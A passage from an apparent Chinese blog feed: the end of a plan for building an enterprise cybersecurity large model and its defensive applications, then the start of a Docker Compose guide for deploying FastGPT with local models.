scratch）训练一个大模型，最典型的代表是 BloombergGPT</li><li><strong>二次预训练</strong>：在一个通用模型的基础上做二次&#x2F;继续预训练（continue pretrianing），最典型的代表是 LawGPT</li><li><strong>微调</strong>：在一个通用模型的基础上进行有监督微调（Supervised Fine-Tuning），这也是现在开源社区最普遍的做法</li><li><strong>通用大模型 + 向量知识库</strong>：通用大模型加上领域知识库，针对通用大模型学习过的领域知识比较少的问题，利用向量数据库等方式根据问题在领域知识库中找到相关内容，再利用通用大模型强大的总结和问答能力生成比较流畅的回复</li><li><strong>上下文学习（In context learning）</strong>：随着通用大模型能够接受的上下文窗口越来越大，将领域知识直接放在提示词（prompt）中，同样利用通用大模型强大的总结和问答能力生成比较流畅的回复</li></ul></li><li>最后两种策略不涉及到对通用大模型的调教，自然也无从谈起自有的集团基座大模型</li><li>通用大模型微调的方案虽然见效比较快，且对于数据量大小的需求也不是很严苛，但是能够达到的上限不高</li><li>从零训练和二次预训练的方案比较适合建设行业基座大模型，两种方案的数据量和算力资源需求也不相同<ul><li>根据模型参数量大小，两种方案的算力需求最低推荐为百卡起步</li><li>数据方面除了要考虑数据量大小外，不同类型数据的配比以及数据清洗处理后的质量对于最终模型的效果至关重要，一般认为二次预训练中领域数据的比例在 10% - 15% 比较合适</li></ul></li></ul><h3 id="孵化流程"><a href="#孵化流程" class="headerlink" title="孵化流程"></a>孵化流程</h3><ul><li>包括集团模型在内，以及以集团模型为基础衍生而来的领域专用模型，都遵守统一的孵化流程，以安全大模型为例：<ul><li><strong>需求</strong>：需求阶段要明确需求，确定安全大模型本轮的训练目标，如<ul><li>通过二次预训练补充特定方向的安全知识</li><li>通过微调训练出更适合下游任务的专业安全大模型</li></ul></li><li><strong>数据</strong>：明确需求后，相应的数据类型和配比也能够明确<ul><li>二次预训练任务的数据类型需要和基座大模型预训练时保持一致，特定方向的安全领域数据占比控制在 10% - 15%，最多不超过20%</li><li>微调任务中特定方向的安全领域数据量不大的情况下，和通用数据的比重可为 1:1</li></ul></li><li><strong>算法</strong>：任务类型明确之后，算法阶段就是选择合适的算法<ul><li>二次预训练主要借助于诸如 DeepSpeed &#x2F; PaddlePaddle 等框架实现</li><li>目前主流的微调算法有 LoRA &#x2F; QLoRA &#x2F; P-Turning &#x2F; Freeze 等</li></ul></li><li><strong>训练</strong>：训练阶段即是通过分布式技术在训练集群中并行训练模型</li><li><strong>评估</strong>：模型训练完成之后，需要对模型进进行能力评估，主要涉及的方面有<ul><li>基座大模型能力的保持程度，即训练后的模型是否依然保持很强的总结、问答、命令执行等能力</li><li>安全领域知识的学习程度，即对于准备的领域知识，大模型的理解吸收能力</li></ul></li><li><strong>测试</strong>：测试阶段主要是测试训练后的大模型<ul><li>是否存在严重的记忆遗忘、“幻觉”等问题</li><li>是否存在泄露隐私数据等数据安全问题</li></ul></li><li><strong>打包</strong>：符合部署标准的训练后大模型按照应用部署环境进行打包</li><li><strong>部署</strong>：根据具体环境进行部署，如提供 API 接口、嵌入式部署等</li><li><strong>发布</strong>：确定数据，模型，应用之间的交互流程之后即可发布</li><li><strong>监控</strong>：监控部署后模型整个生命周期中的信息，如推理算力使用情况、数据流转情况等</li><li><strong>反馈</strong>：建立大模型运行过程中的用户反馈机制，收集运行中遇到的实际问题及反馈，反馈数据可用于下一步大模型的优化阶段</li><li><strong>需求</strong>：根据实际运营中的反馈，针对收集总结的问题，转换成具体的需求，开始新一轮的孵化流程</li></ul></li></ul><h3 id="领域模型"><a href="#领域模型" class="headerlink" title="领域模型"></a>领域模型</h3><ul><li>在集团大模型的基座上，通过调整数据类型配比，衍生出各个子领域专用大模型，比如业务大模型、安全大模型等。</li><li>在这些子领域专用大模型的基础上，通过针对性的微调，使得这些专用大模型转变成为专家大模型。<ul><li>比如业务大模型可以转变成精通电力知识的专家大模型，或者熟悉电力调度的专家大模型等</li></ul></li><li>其中从安全大模型衍生而来的专家大模型，主要可分为以下五个方向：<ul><li><strong>安全运营</strong>：安全运营数据清洗，多源异构数据提炼，告警分析智能研判，威胁事件智能解读等</li><li><strong>威胁检测</strong>：网络攻击报文分析，终端异常行为分析，恶意代码检测，社工钓鱼检测等</li><li><strong>安全防护</strong>：情报联防联控，安全事件溯源等</li><li><strong>攻防实战</strong>：资产暴露面收集，漏洞利用评估，漏洞检测工具生成，响应处置咨询等</li><li><strong>风险评估</strong>：风险模式识别，风险关联分析，资产风险识别，拓扑关系分析等</li></ul></li></ul><h2 id="模型能力层"><a href="#模型能力层" class="headerlink" title="模型能力层"></a>模型能力层</h2><ul><li>完成构建集团安全领域大模型之后，模型能力层主要负责的是将安全大模型的能力通过简单易配置的框架，以接口或服务等方式为各个应用场景赋能。</li></ul><h3 id="模型部署框架"><a href="#模型部署框架" class="headerlink" title="模型部署框架"></a>模型部署框架</h3><ul><li>模型部署框架主要负责安全大模型本身的推理部署。</li><li>为了应对多种多样的部署环境，除了支持模型高精度推理外，还需要支持通过模型量化，蒸馏和剪枝等技术，在尽可能保持模型原本能力的基础上，减少模型的资源占用，提升推理速度。</li><li>部署模式除了支持常见的 API 接口的方式，同时需要支持嵌入式部署优化模型的方式，满足某些特殊场景中将大模型技术与端点设备集成的需求。</li></ul><h3 id="Agent-配置框架"><a href="#Agent-配置框架" class="headerlink" title="Agent 配置框架"></a>Agent 配置框架</h3><ul><li><p>模型能力最关键的模块是 Agent 配置框架，该框架需要支持智能体的快速定义和生成，提供即插即用的应用接口，场景模式的可视化编排，以及智能体全生命周期的监控，并能根据监控数据和反馈信息，及时由安全专家介入干预和修正。</p></li><li><p>智能体的架构主要可以分为 3 个模块，脑模块，感知模块和行动模块。</p><ul><li><p>脑模块作为智能体的中央处理核心</p>  <center>      <img src="/img/SecLLM/SecLLM13.png" width="850">  </center>  <ul><li>它的首要功能是自然语言交互功能，其中涉及到核心问题有：<ul><li>多轮交互下的信息有效性和统一性问题</li><li>高质量自然语言生成问题</li><li>语言中隐藏含义的理解问题等</li></ul></li><li>第二个功能涉及到知识领域，每个智能体需要了解对应的知识，大体上可分为 3 种：<ul><li>语言知识，意味着智能体需要了解输入的统一数据表示的意义</li><li>常识知识</li><li>专业领域知识</li></ul></li><li>第三个是记忆功能，如何保证多轮交互以及多 Agent 交互之后的信息同步是很重要的课题。为此可能的解决办法有：<ul><li>提升 transformer 模型的上下文长度限制</li><li>将信息抽象提炼，再存入记忆模块</li><li>压缩信息，寻找更为高效的信息表示方法</li><li>共享记忆，类似外挂知识库的方案</li></ul></li><li>第四个是推理和规划功能，旨在培养智能体形成人类一样的链式思维，一步一步的进行推导和规划</li><li>最后是学习功能，为了形成自洽的系统，智能体必须要自主学习，从而摆脱必须依赖人类指令运行的情况</li></ul></li><li><p>感知模块，这个模块相对而言比较简单明了，就是将多源异构的数据转换成统一的数据表示</p>  <center>      <img src="/img/SecLLM/SecLLM14.png" width="850">  </center>  </li><li><p>行动模块，主要分为 2 个子功能：</p>  <center>      <img src="/img/SecLLM/SecLLM15.png" width="850">  </center>  <ul><li>第一个是文字或图像输出功能，即将抽象的统一数据转换成人类理解的自然语言或图像</li><li>第二个是工具模块。这里主要考虑的是在响应和恢复阶段，智能体需要能够根据分析研判结果，调用甚至制造对应的工具实现攻击阻断和风险修复等工作任务</li></ul></li></ul></li><li><p>此外，需要考虑整个智能体系统内的信息交互模式</p>  <center>      <img src="/img/SecLLM/SecLLM16.png" width="850">  </center>  <ul><li>首先对于单个 Agent 来说，主要分为 3 种情况：<ul><li>第一种是任务导向，那么这个智能体只需要接受输入，根据人类指定的行为范式给出输出</li><li>第二种是灵感导向，意思是人类给出一个目标，智能体从结果逆推，自行寻找需要的输入并完成目标</li><li>第三种是生命周期导向，是指类似 AutoGPT 那样的实体，自身实现一个任务的闭环运行无需人类的指令</li></ul></li><li>其次，对于 Agents 之间的交互场景概括起来其实很简单，就分为两种情况：<ul><li>一是多个 Agents 合作完成任务的模式</li><li>二是 Agents 之间通过对抗的模式相互促进</li></ul></li><li>最后是人机交互，也分为两种情况：<ul><li>一是指导-执行范式。指人类给出指令，指导智能体执行对应动作、</li><li>二是合作范式，指人类和机器合作完成相应任务目标</li></ul></li></ul></li></ul><h2 id="场景应用层"><a href="#场景应用层" class="headerlink" title="场景应用层"></a>场景应用层</h2><ul><li>场景应用曾主要是具体的应用场景，即以模型本身或者智能体的形态为具体的应用或落地场景进行赋能。</li></ul><h3 id="安全运营"><a href="#安全运营" class="headerlink" title="安全运营"></a>安全运营</h3><ul><li>安全智能问答<ul><li>理解用户的提问，在答案中进行检索或者生成答案以满足用户的需求。在安全领域，智能问答系统的价值体现在其可以针对用户安全场景对安全专业知识、安全产品与解决方案等方面问题进行回答。</li><li>为安全专业人员和普通用户提供高质量、高效率、智能化的安全问题解答和支持，帮助他们更好地理解安全问题、协助做出安全决策。同时结合知识图谱辅助问句理解，借助只是图谱中节点的属性及关系，通过命名实体识别等技术发现问句中的实体，进而更好地理解问题。完成意图理解后，通过图匹配从安全知识图谱检索相关的实体作为应答，同时通过信息检索获得文本应答，最后将实体应答与文本应答拼接形成回复答案。</li></ul></li><li>多源情报整合<ul><li>整合多个不同来源的安全情报信息，提供更准确、全面的威胁情报，帮助组织更好地应对安全威胁。</li><li>借助安全大模型地语义理解能力实现信息总结、情报归类、实体标定等。信息总结功能主要涉及到阔平台信息整合、垃圾信息过滤、重点提炼等。通过安全大模型对信息进行语义分析和关联性识别，将来自不同渠道的多种形式的信息汇聚为有机的整体，消除信息碎片化问题，从而提高信息整理的效率和全面性。接下来对于情报之间的关联点、相似性，将其有序归类，实现情报梳理和整合的自动化。最后对信息中的现实实体（包括但不限于设备、人员、组织、漏洞、事件等），分析其性质、热度、上下文，以及实体之间的关联性，综合考量后给出初步判断（包括其风险度、紧急度等内容），为情报分析提供更深入的视角。</li><li>最终目标是在多来源、多模态信息上提供出色的智能归纳和综合分析能力，有效提高情报信息额利用效率和价值，为决策者提供更全面、准确的情报信息支持。</li></ul></li><li>安全日志智能解析<ul><li>传统的安全信息和事件管理（SIEM）系统，包括安管平台、SOC平台等，日志解析是一个关键卡点，目标整合来自多个安全设备和应用程序的日志数据，并提供集中化的监控、分析和报告功能。</li><li>基于规则将各种日志的解析内置 SIEM 系统，遇到新的日志时就需要补充新的解析规则。为了减少这部分工作量，一种方案是将目前 SIEM 系统的解析日志和规则的收集起来，用于训练安全大模型或智能体自动化生成解析规则用于新的日志。另一种方案是通过综合分析新型日志的内容，如果 SIEM 可以正确解析不同的日志，则跳过现有解析规则，直接将解析完毕的日志结果转换成为 JSON 格式对接 SIEM 系统，使其能够准确地提取有用地信息，并将其转化为可供安全分析和威胁检测的形式，也即将安全大模型或智能体加强日志解析的能力直接输入到 SIEM 系统，由 SIEM 系统提供日志检索和进一步的威胁分析。</li></ul></li><li>安全事件分析研判<ul><li>将安全大模型机器衍生的智能体应用于安全事件分析研判，协助安全运营人员快速、准确、全面地识别和评估威胁攻击事件，解决安全领域中的安全告警和日志数据处理难题、多维度数据关联复杂和复杂威胁识别难题。<ul><li>在准备训练样本时，应当尽可能覆盖各种类型的安全事件。在仿真环境中采集黑样本是必要但远远不够的。而从真实环境中采集数据时应注意，安全事件数据分布会随网络环境、业务种类、防护策略等因素差异很大，应避免从单一环境中进行采集。</li><li>数据标注方面，需要由人类专家对安全事件进行标注，虽然成本很高，却是唯一实际有效的方法。人工标注中一般需要进行抽样，需要首先设计并验证抽样方法的有效性。需要特别注意的是，标注数据集应当平衡正负样本数量，尤其需要尽可能完善各类正常业务活动产生的日志及其标注，而不能只关注攻击事件的日志。</li><li>由于安全事件数据本身并非自然语言，如果直接输入以自然语言语料训练的基础模型，将无法有效利用预训练模型中的知识。需要设计并持续优化一套特征方法，用以将安全事件数据转换为模型易于处理的形式。</li></ul></li><li>安全大模型或智能体预期能够实现的部分能力有：<ul><li>通过扩展事件的多样化，可以对不同编码和混淆的告警信息进行事件的准确研判</li><li>通过 RLHF，从告警信息中提取较为深层次的抽象信息，如攻击者所使用的攻击手法、期望达到的目的、可能造成的影响等，然后将其转化为通俗易懂的买哦书形式。</li></ul></li></ul></li></ul><h3 id="威胁检测"><a href="#威胁检测" class="headerlink" title="威胁检测"></a>威胁检测</h3><ul><li>深度威胁检测<ul><li>基于安全大模型，对于网络侧的流量，主机侧的文件、日志、进程行为等维度进行威胁检测：<ul><li><strong>异常检测</strong>：大模型可以通过学习正常的网络流量模式和行为特征来检测异常。当网络活动与正常模式不符时，发出警报并进行进一步的调查。</li><li><strong>恶意软件检测</strong>：大模型可以分析文件、应用程序和代码，以检测潜在的恶意软件。它们可以识别恶意软件的特征、行为模式和代码签名，并通过比对已知的恶意软件数据库来进行分类。</li><li><strong>行为分析</strong>：大模型可以分析用户和设备的行为模式，以检测潜在的异常活动。识别恶意操作、数据泄露和内部威胁，并采取相应的响应措施。</li><li><strong>社工攻击检测</strong>：大模型可以分析电子邮件、消息和社交媒体活动，帮助检测可能的社交工程攻击，提高检测效率和效果。</li></ul></li></ul></li></ul><h3 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护"></a>安全防护</h3><ul><li>勒索情报挖掘<ul><li>借助大模型的相关能力在分析勒索威胁情报过程中解决勒索情报来源的多样性、多维度勒索情报信息整合和复杂威胁特征分析及洞察等难题，挖掘、揭示攻击者的策略和行为模式，结合资产及相关风险信息，预测可能的下一步攻击目标，协助安全团队更好地理解和应对勒索软件地威胁，提前制定防御策略。</li><li>整体流程可以拆分为 3 个智能体相互协助完成：<ul><li><strong>威胁情报文本主题分类智能体</strong>：该智能体通过勒索情报主体分类的方法，快速定位和识别与勒索软件相关的情报，了解勒索软件的种类和演变趋势，为安全策略的制定和威胁预警提供更全面的情报洞察。</li><li><strong>勒索相关情报的关键信息提取智能体</strong>：该智能体主要负责提取勒索相关的威胁情报中包括勒索软件的加密方式、攻击手段、利用漏洞、勒索情报地址和 IOCs（Indicators of Compromise）等数据。这些信息可以用于协助其他智能体快速了解勒索事件的特征和威胁程度，以便及时采取相应的安全措施。</li><li><strong>勒索智能分析处置智能体</strong>：该智能体负责根据上一步提取的相关数据，分析事件特征和威胁程度，自动化生成防御策略，同时结合资产数据及时通报存在风险的资产。</li></ul></li></ul></li><li>智能防护助手<ul><li>面对安全防护工作压力大、人员不足的困境，亟需智能化安全运营工具提升防护效率。智能防护助手可以实现人机协同，进一步增强安全防御的智能化和及时性，提升威胁检测、响应和决策的能力，主力安全团队更有效地维护网络安全。</li><li>衍生于安全大模型的智能防护助手能够调用相关工具执行防护人员的决策和规划，通过将决策转化为实际行动，更好地应对不同情况下的挑战。同时智能防护助手还需要及时获取工具执行后的反馈信息，从而对决策和行动进行实时的调整和优化。</li><li>智能防护助手作为决策中枢，接收交互界面采集的用户多模态输入，进而完成用户意图理解以及任务管理调度的核心决策逻辑，进而调用告警数据查询、分析统计报告、告警智能分诊、告警上下文溯源等分诊加速工具，形成对专家研判过程的辅助能力，或者针对高置信度告警事件自动化处置。</li></ul></li></ul><h3 id="攻防实战"><a href="#攻防实战" class="headerlink" title="攻防实战"></a>攻防实战</h3><ul><li>智能攻防对抗演练<ul><li>攻防演练是模拟真实攻击和防御情景的训练活动。场景涵盖网络入侵、恶意代码、数据泄露等多种攻击，并验证团队的应急反应，以使组织能够迅速、高效地应对真实威胁。通过训练活动帮助组织有效地应对现实中地安全威胁和攻击，提升整体的安全性和应急响应能力。</li><li>基于大模型的智能体通过自动对抗，形成长期自主进化的攻防对抗能力。这一能力源于模型在复杂攻防环境中的训练和学习，它能够识别并适应新的威胁，不断调整策略以有效应对不断变化的攻击技术。输入攻防演练需求，通过模拟各类攻击和防御场景，基于安全大模型的智能体不仅学习攻击方法，还能掌握多种防御策略，从而逐步形成多样化的应对能力。智能体可以快速感知威胁，做出智能决策。并将决策转化为实际行动，从而提高安全防御、响应的效率和准确性，最后输出演练报告进行总结复盘。</li></ul></li></ul><h3 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h3><ul><li>代码漏洞挖掘<ul><li>漏洞挖掘和代码审计是两种密切相关的安全实践，在软件开发和安全领域中都有重要作用。漏洞挖掘分析是代码进行静态或动态的安全分析，以发现代码中存在的潜在漏洞或风险。代码审计重在对代码的静态分析，以查找可能存在的漏洞、弱点和安全风险，从而提高代码质量，降低开发成本，提升安全防护能力。</li><li>借助大模型的能力可以高效的处理大量的代码数据，利用其自身强大的学习能力和推理能力，快速发现代码中的潜在漏洞，根据上下文和目标，自动地提供合适的代码建议和修改方案，提高代码的质量和安全性。</li></ul></li><li>软件供应链安全<ul><li>软件供应链安全的需求涵盖了软件从源代码审查到交付和部署的整个过程，以确保软件在每个环节都是安全和可信的。这有助于减少潜在的威胁和漏洞，保护集团的数据和声誉。</li><li>借助安全大模型丰富的先验知识和强大的语义理解能力，结合知识图谱，不仅能有效融合软件供应链领域中的多源信息，还能深入分析实体的上下文信息，进而提升模型对于软件供应链中实体与关系的语义理解水平。最终实现通过智能体之间的配合完成信息抽取、供应链健康评分、供应链敏感发现、智能分析预警等任务。<ul><li>软件供应链领域涉及众多的非结构化数据源，如 CVE、NVD、CNVD 等开源漏洞库、漏洞 Twitter、安全通告等数据。通过智能体自动化将多源数据处理成结构化数据存入知识图谱，从而对知识图谱中额缺失节点、关系进行信息补全。</li><li>供应链健康评分智能体主要根据两方面的数据进行建模，其一为开源软件的社区热度、影响范围、版本维度频率、安全风险等结构化数据，其二为开源软件的 issue 文本、版本描述、更新信息等非结构化文本。智能体需要先对非结构化文本进行向量化操作，获取非结构化文本中的语义特征，然后融合语义特征和结构化字段构建健康评分模型，最后分别考虑社区热度、安全风险、影响范围、版本维护等多为信息，为供应链软件的健康程度提供综合评价。</li><li>敏感信息是资产脆弱性分析的重要维度。通过对开源供应链的 git 仓库、组件官方公告、相关供应链公众号文章进行敏感信息抽取，例如电话、邮箱、身份证、IP、银行卡、URL、域名、MAC、IPv6、JDBC 等敏感实体类型，以扩充供应链图谱的敏感信息，进而有利于资产风险发现。</li><li>最终结合上述流程中获取的数据，结合实际资产信息，智能分析资产风险及脆弱性，及时预警。</li></ul></li></ul></li><li>集团 EASM 评估<ul><li>外部攻击面管理（External Attack Surface Management，EASM）是企业安全评估中不可忽视的能力。企业安全 EASM 评估对企业的外部攻击面进行全面的管理和评估，包括发现、监测和缓解外部攻击可能的入口。EASM 确保企业的应用程序在安全性、合规性、风险管理和应急响应等方面得到有效的管理和保护。</li><li>安全大模型或者衍生而来的智能体站在潜在攻击者的角度来持续不断地审视与管理组织资产和薄弱环节，包含以下三部分：<ul><li><strong>持续监控和全面收集数据</strong>：协助组织监控和处理多种数据，包括社交媒体、SSL 证书、域名信息、漏洞数据库、违规数据集、深网&#x2F;暗网资源、代码存储库等。不同数据整合到安全大模型或智能体，快速识别和清理无效信息，收集和整理与组织相关地公开可见信息。</li><li><strong>智能体 + 威胁情报分析</strong>：将大模型或智能体与威胁情报数据相结合，对外部攻击面进行威胁分析。通过与威胁情报数据地对比，及时发现可能受到攻击的系统和服务，有效协助组织及时进行攻击面收敛，将配置不当、开放端口、未修复漏洞等根据紧急程度、严重性、风险等级确定修复优先次序。除此之外，结合已有资产信息以及调用漏洞扫描等各类工具，对资产列表进行实时维护。</li><li><strong>外部攻击面评估</strong>：利用大模型或智能体进行数据分析和挖掘，对组织的外部攻击面进行评估。将合适的数据和技术工具化，对各种风险进行排序，发现潜在的漏洞、安全风险和脆弱性，帮助安全团队识别潜在的攻击入口、攻击路径等。</li></ul></li></ul></li><li>数据安全<ul><li>安全大模型大模型在数据安全方面的应用可以帮助组织保护其敏感数据，并识别潜在的数据安全风险。可能的应用有：<ul><li><strong>数据分类与标记</strong>：大模型可以帮助组织自动识别和分类其数据，包括个人身份信息（PII）、医疗记录、财务数据等敏感信息。通过对数据进行标记和分类，组织可以更好地了解其数据资产，并制定相应的保护策略。</li><li><strong>数据泄露检测</strong>：大模型可以监控数据传输和存储过程，以检测可能的数据泄露事件。它们可以识别异常的数据访问模式、异常的数据传输行为，并发出警报以及采取相应的应对措施。</li><li><strong>身份验证与访问控制</strong>：大模型可以用于用户身份验证和访问控制，以确保只有授权用户能够访问敏感数据。它们可以分析用户的行为模式、设备信息和其他身份验证因素，并根据风险评估来动态调整访问权限。</li><li><strong>数据加密与脱敏</strong>：大模型可以帮助组织选择适当的数据加密和脱敏技术，以保护敏感数据免受未经授权的访问。它们可以分析数据的敏感程度和业务需求，制定相应的加密和脱敏策略。</li><li><strong>数据审计与合规</strong>：大模型可以帮助组织进行数据审计和合规性监管，以确保其数据安全措施符合相关法规和标准。它们可以分析数据访问日志、操作记录，并生成合规性报告和审计跟踪。</li></ul></li></ul></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;集团网络安全大模型建设方案&quot;&gt;&lt;a href=&quot;#集团网络安全大模型建设方案&quot; class=&quot;headerlink&quot; title=&quot;集团网络安全大模型建设方案&quot;&gt;&lt;/a&gt;集团网络安全大模型建设方案&lt;/h1&gt;&lt;p&gt;本文主要内容是关于目前网络安全垂直领域大模型情况调研，以及关于集团大模型的建设方案设想。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>基于本地大模型的 FastGPT 框架部署</title>
    <link href="https://coldwave96.github.io/2024/03/08/FastGPT/"/>
    <id>https://coldwave96.github.io/2024/03/08/FastGPT/</id>
    <published>2024-03-08T12:27:35.000Z</published>
    <updated>2024-03-08T12:27:35.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://fastgpt.in/">FastGPT</a> 是一款强大的 LLM + RAG 解决方案，本文记录了基于本地大模型搭建 FastGPT 框架的过程。</p><span id="more"></span><h1 id="整体框架说明"><a href="#整体框架说明" class="headerlink" title="整体框架说明"></a>整体框架说明</h1><center>    <img src="/img/FastGPT/sealos-fastgpt.png" width="850"></center><ul><li>整体框架由 4 部分组成，分别为数据库、FastGPT、OneAPI、大模型</li></ul><h2 id="FastGPT"><a href="#FastGPT" class="headerlink" title="FastGPT"></a>FastGPT</h2><ul><li>框架本体，默认使用 OpenAI 的大模型接口</li></ul><h3 id="开发组件依赖"><a href="#开发组件依赖" class="headerlink" title="开发组件依赖"></a>开发组件依赖</h3><ul><li>Docker</li><li>Node.js v18.x</li><li>pnmp 版本 8.x.x</li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li><p>MongoDB 用于存储 FastGPT 框架运行所需的数据</p></li><li><p>pgvector 用于存储知识库向量</p><table><thead><tr><th>环境</th><th>最低配置（单节点）</th><th>推荐配置</th></tr></thead><tbody><tr><td>测试</td><td>2c2g</td><td>2c4g</td></tr><tr><td>100w 组向量</td><td>4c8g 50GB</td><td>4c16g 50GB</td></tr><tr><td>500w 组向量</td><td>8c32g 200GB</td><td>16c64g 200GB</td></tr></tbody></table></li></ul><h2 id="OneAPI"><a href="#OneAPI" class="headerlink" title="OneAPI"></a>OneAPI</h2><ul><li>OneAPI 是大模型调用接口框架，负责对接大模型调用接口，提供权限控制和收费统计等功能</li></ul><h2 id="本地大模型"><a href="#本地大模型" class="headerlink" title="本地大模型"></a>本地大模型</h2><ul><li>提供的本地大模型接口需要符合 OpenAI 的接口规范</li><li>综合显存需求<ul><li>最少：32GB+</li><li>推荐：48GB+</li></ul></li></ul><h3 id="对话大模型"><a href="#对话大模型" class="headerlink" title="对话大模型"></a>对话大模型</h3><ul><li>Baichuan 2</li><li>ChatGLM 2&#x2F;3</li></ul><h3 id="Embedding-模型"><a href="#Embedding-模型" class="headerlink" title="Embedding 模型"></a>Embedding 模型</h3><ul><li>m3e-large</li></ul><h3 id="ReRank-模型"><a href="#ReRank-模型" class="headerlink" title="ReRank 模型"></a>ReRank 模型</h3><ul><li>bge-reranker-large</li></ul><h1 id="基于-Docker-Compose-的快速部署"><a href="#基于-Docker-Compose-的快速部署" class="headerlink" title="基于 Docker Compose 的快速部署"></a>基于 Docker Compose 的快速部署</h1><h2 id="部署本地模型-OneAPI"><a href="#部署本地模型-OneAPI" class="headerlink" title="部署本地模型 + OneAPI"></a>部署本地模型 + OneAPI</h2><ul><li><p>部署实例中使用的本地模型组合为 Baichuan2-7B-Chat + M3E-large + BGE-ReRanker-base</p></li><li><p>硬件资源和前置需求见下方分布式部署相关章节</p></li><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> llm</span><br><span class="line"><span class="built_in">cd</span> llm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载 docker-compose.yml 文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/LLM-DockerCompose/docker-compose.yml</span><br></pre></td></tr></table></figure></li><li><p>根据<code>docker-compose.yml</code>文件中的提示修改对应的信息</p></li><li><p>通过以下命令控制相关容器</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">docker compose up -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止</span></span><br><span class="line">docker compose down</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置-OneAPI"><a href="#配置-OneAPI" class="headerlink" title="配置 OneAPI"></a>配置 OneAPI</h2><ul><li>登陆<code>http://&lt;gpu_server_ip&gt;:8000</code>，初始账号密码<code>root/123456</code> ，登陆成功后及时修改默认密码</li><li>点击<code>令牌</code>→<code>添加新的令牌</code>，输入名称，内部使用可设置<code>永不过期 + 设置无限额度</code></li><li>回到<code>令牌</code>，点击<code>复制</code>即可获取<code>Token</code></li><li>点击<code>渠道</code>→<code>添加新的渠道</code><ul><li>添加 Baichuan2-7B-Chat<ul><li>类型：<code>OpenAI</code></li><li>名称：<code>Baichuan2-7B-Chat</code>（随意）</li><li>模型：<code>Baichuan2-7B-Chat</code>（随意，FastGPT 配置文件中与之对应即可）</li><li>密钥：本地大模型接口的<code>SK-KEY</code> 值</li><li>代理：<code>http://&lt;gpu_server_ip&gt;:8001</code></li></ul></li><li>添加 M3E-large<ul><li>类型：<code>自定义渠道</code></li><li>Base URL：<code>http://&lt;gpu_server_ip&gt;:8002</code></li><li>名称：<code>M3E-large</code>（随意）</li><li>模型：<code>M3E-large</code>（随意，FastGPT 配置文件中与之对应即可）</li><li>密钥：本地模型接口的<code>SK-KEY</code>值</li></ul></li></ul></li></ul><h2 id="部署-FastGPT"><a href="#部署-FastGPT" class="headerlink" title="部署 FastGPT"></a>部署 FastGPT</h2><ul><li><p>在本地创建文件夹并下载相关文件</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> fastgpt</span><br><span class="line"><span class="built_in">cd</span> fastgpt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载相关文件</span></span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/docker-compose.yml</span><br><span class="line">curl -O https://raw.githubusercontent.com/Coldwave96/FastGPT-Deploy-Utilities/main/FastGPT/config.json</span><br></pre></td></tr></table></figure><ul><li>注意: docker-compose.yml 配置文件中 Mongo 为 5.x，部分服务器不支持，需手动更改其镜像版本为 4.4.24</li></ul></li><li><p>修改 docker-compose.yml 中的 OPENAI_BASE_URL（API 接口的地址，需要加&#x2F;v1）和CHAT_API_KEY（API 接口的凭证)</p></li><li><p>使用 OneAPI 的话，OPENAI_BASE_URL&#x3D;OneAPI访问地址&#x2F;v1；CHAT_API_KEY&#x3D;令牌</p></li><li><p>修改 config.json 中的本地问答大模型、Embedding 模型以及 ReRank 模型的相关信息</p></li><li><p>在 docker-compose.yml 同级目录下执行</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line"><span class="built_in">cd</span> 项目目录</span><br><span class="line"><span class="comment"># 创建 mongo 密钥</span></span><br><span class="line">openssl rand -<span class="built_in">base64</span> 756 &gt; ./mongodb.key</span><br><span class="line"><span class="comment"># 600不行可以用chmod 999</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ./mongodb.key</span><br><span class="line"><span class="built_in">chown</span> 999:root ./mongodb.key</span><br><span class="line"><span class="comment"># 启动容器</span></span><br><span class="line">docker compose pull</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure></li><li><p>初始化 Mongo 副本集(4.6.8以前可忽略)</p><ul><li>Mongo 数据库需要修改副本集的host，从原来的mongo:27017修改为ip:27017。</li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 